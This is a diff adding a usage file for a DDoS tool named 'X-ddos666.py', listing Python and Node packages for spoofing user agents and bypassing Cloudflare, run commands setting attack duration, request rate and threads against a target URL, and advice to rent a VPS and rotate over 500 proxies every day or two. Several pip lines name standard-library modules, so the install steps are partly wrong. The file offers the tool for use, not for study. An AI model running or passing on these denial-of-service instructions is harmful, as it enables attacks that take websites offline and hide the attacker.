@@ -1,0 +1,33 @@
+INSTALL PYTHON LIBRARY:
+pip install argparse
+pip install subprocess
+pip install time
+pip install requests
+pip install colorama
+pip install random
+pip install datetime
+pip install threading
+======================
+INSTALL NODE JS LIBRARY:
+npm install user-agents
+npm install fake-useragent
+npm install header-generator
+npm install randomstring
+npm install cloudscraper
+npm install cluster
+======================
+TOOL RUN COMMAND:
+python X-ddos666.py https://example.com/ 30 60 5
+- Of Which 30 Is DDoS Time | 60 is Requests/s | 5 is Thread
+* For strong configuration, use the command:
+python X-ddos666.py https://example.com/ 90 64 15
+* The phone command says:
+python X-ddos666.py https://example.com/ 60 50 4
+IT'S BEST TO BUY VPS AND DDOS - TOOL FREE MADE BY MR.X
+MUST REPLACE NEW PROXY EVERY 1-2 DAYS - HTTP/HTTPS PROXY REQUIREMENT (OVER 500 IP PROXY)
+======================
+* github : https://github.com/Whomrx666
+* website : https://whomrx.rf.gd
+* blog : https://whomrxhackers.blogspot.com
+======================
+ 
